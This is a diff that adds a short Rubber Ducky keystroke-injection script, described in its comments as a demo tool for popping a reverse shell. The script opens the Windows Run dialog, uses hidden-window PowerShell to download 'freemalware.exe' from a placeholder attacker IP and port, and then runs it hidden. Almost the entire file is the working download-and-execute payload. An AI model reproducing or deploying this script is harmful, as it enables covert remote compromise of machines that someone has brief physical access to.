@@ -1,0 +1,12 @@
+REM Ducky Script for Invoking a Web Request in Powershell and downloading a file from a Python SimpleHTTPServer.
+REM This allows the user to pop a simple reverse shell - useful for PoC demos / presentations. 
+REM Feel free to play with delays as needed - some computers are faster than others :D 
+REM Author: Nautilus
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell -WindowStyle Hidden Invoke-WebRequest <INSERT IP AND PORT>/freemalware.exe -OutFile freemalware.exe
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell -WindowStyle Hidden ./freemalware.exe
